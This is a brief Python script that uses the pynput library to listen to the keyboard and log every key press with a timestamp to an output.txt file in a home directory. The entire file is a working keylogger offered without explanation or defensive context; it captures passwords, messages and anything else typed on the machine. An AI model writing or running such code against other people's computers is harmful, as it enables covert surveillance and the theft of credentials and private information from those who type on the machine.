import logging
from pynput.keyboard import *

dir="/home/amun-ra/"

logging.basicConfig(filename=(dir +"output.txt"),level=logging.DEBUG,format="%(asctime)s:%(message)s")

def typekey(key):
    logging.info(key)

with Listener(on_press=typekey) as logger:
    logger.join()